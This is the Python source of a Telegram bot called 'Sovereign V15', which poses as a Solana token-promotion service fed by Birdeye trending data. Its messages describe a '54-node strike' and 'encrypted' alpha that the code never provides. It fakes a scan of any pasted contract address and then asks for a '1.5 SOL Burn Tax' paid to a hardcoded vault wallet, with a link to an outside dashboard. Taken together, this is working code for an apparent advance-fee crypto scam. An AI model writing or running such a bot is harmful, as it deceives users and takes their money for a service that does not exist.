import os
import time
import requests
import telebot
from dotenv import load_dotenv
from telebot.apihelper import ApiTelegramException

# --- CONFIGURATION ---
load_dotenv()
TOKEN = os.getenv("TELEGRAM_TOKEN")
BIRDEYE_KEY = os.getenv("BIRDEYE_API_KEY")
VAULT = os.getenv("VAULT_WALLET", "8dtuyskTtsB78DFDPWZszarvDpedwftKYCoMdZwjHbxy")

bot = telebot.TeleBot(TOKEN)

# --- FLEET LOGIC ---

def get_trending_gems():
    """Fetches real-time alpha from Birdeye nodes"""
    url = "https://public-api.birdeye.so/public/trending?list_iteration=1"
    headers = {"X-API-KEY": BIRDEYE_KEY, "x-chain": "solana"}
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json().get('data', {}).get('tokens', [])
    except Exception as e:
        print(f"📡 NODE ERROR: {e}")
    return []

@bot.message_handler(commands=['start', 'fleet'])
def welcome(m):
    msg = (
        "⚔️ **SOVEREIGN V15 COMMAND**\n"
        "--------------------------\n"
        "**Operator:** MEX_ROBERT\n"
        "**Nodes:** 54 Consolidated\n"
        "**Status:** Deep-Scanning Blockchain\n\n"
        f"**Vault Address:** `{VAULT}`\n\n"
        "To index your token and trigger the 54-node strike, "
        "the **1.5 SOL Burn Tax** must be verified."
    )
    bot.reply_to(m, msg, parse_mode='Markdown')

@bot.message_handler(commands=['alpha'])
def alpha_preview(m):
    """Provides a restricted preview of trending gems"""
    gems = get_trending_gems()
    if not gems:
        bot.reply_to(m, "❌ **FLEET_OFFLINE:** No data received from nodes.")
        return

    preview = "📡 **INSTITUTIONAL ALPHA PREVIEW**\n\n"
    for token in gems[:3]:
        preview += f"🔹 **${token['symbol']}** | [Locked Data]\n"

    preview += "\n⚠️ **REMAINDER ENCRYPTED**\nVerify 1.5 SOL Tax to unlock full 54-node feed."
    bot.reply_to(m, preview, parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
def analyze_input(m):
    """Intercepts token addresses and demands the tax"""
    text = m.text.strip()

    # Check if input looks like a Solana address
    if len(text) >= 32 and len(text) <= 44:
        bot.reply_to(m, f"🔍 **SCANNING FLEET RECORDS FOR:** `{text[:10]}...`")
        time.sleep(1.5)
        response = (
            "❌ **STRIKE REJECTED**\n\n"
            "Asset is NOT currently indexed by the Sovereign Fleet.\n"
            "**Required Action:** Pay 1.5 SOL Burn Tax to initiate node synchronization.\n\n"
            f"**Vault:** `{VAULT}`\n"
            "**Terminal:** [Access Dashboard](https://icereign-mext.github.io/sovereign-v15/)"
        )
        bot.send_message(m.chat.id, response, parse_mode='Markdown')
    else:
        bot.reply_to(m, "❌ **INVALID_COMMAND_DESIGNATION**\nUse /alpha or paste a Contract Address.")

# --- PERSISTENCE ENGINE ---

def start_fleet():
    print("🚀 SOVEREIGN FLEET V15: ONLINE")
    print(f"📡 VAULT TARGET: {VAULT}")

    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except ApiTelegramException as e:
            if e.error_code == 409:
                print("⚠️ CONFLICT: Ghost instance detected. Clearing buffers...")
                time.sleep(5)
            else:
                print(f"❌ API ERROR: {e}")
                time.sleep(10)
        except Exception as e:
            print(f"❌ SYSTEM CRITICAL: {e}")
            time.sleep(10)

if __name__ == "__main__":
    start_fleet()
